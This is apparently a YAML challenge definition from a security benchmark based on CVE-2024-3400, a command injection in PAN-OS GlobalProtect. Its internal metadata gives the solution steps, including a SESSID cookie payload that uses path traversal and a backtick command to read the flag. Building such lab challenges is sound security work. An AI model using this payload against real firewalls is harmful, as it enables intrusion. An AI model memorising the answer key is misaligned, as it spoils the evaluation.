id: S7BEN-EASY-018
name: "PAN-OS Command Injection"
tier: 1
difficulty: 3
category: cve
cve: CVE-2024-3400
cvss: 10.0
description: "PAN-OS GlobalProtect gateway with SESSID cookie processing vulnerable to command injection via path traversal and backtick injection."
objective: "Exploit the SESSID cookie command injection to read the flag and exfiltrate it through the device telemetry spool."
flag_pattern: 'S7BEN\{pan0s_cmd_inj_[0-9a-f]{12}\}'
vulnerabilities:
  - type: Command Injection
    cwes: [CWE-78]
owasp_2025: [A03:2025]
difficulty_dimensions:
  recon: medium
  exploit: high
  chaining: low
services:
  app:
    port: 5018
hints: []
tags: [command-injection, pan-os, telemetry, cve]
internal_metadata:
  exploitation_path:
    hints:
      - "CVE-2024-3400 exploits the SESSID cookie in PAN-OS GlobalProtect gateway"
      - "The cookie value is used to construct a file path under the telemetry spool directory"
      - "Path traversal + backtick-enclosed commands in SESSID trigger shell execution"
      - "Command output lands in /opt/panlogs/tmp/device_telemetry/hour/ and is readable via /api/v1/telemetry"
    steps:
      - "GET /global-protect/login.esp to discover the GlobalProtect portal"
      - "Send any request with Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/hour/aaa`cat /app/flag.txt` to inject command"
      - "GET /api/v1/telemetry to retrieve the command output containing the flag"
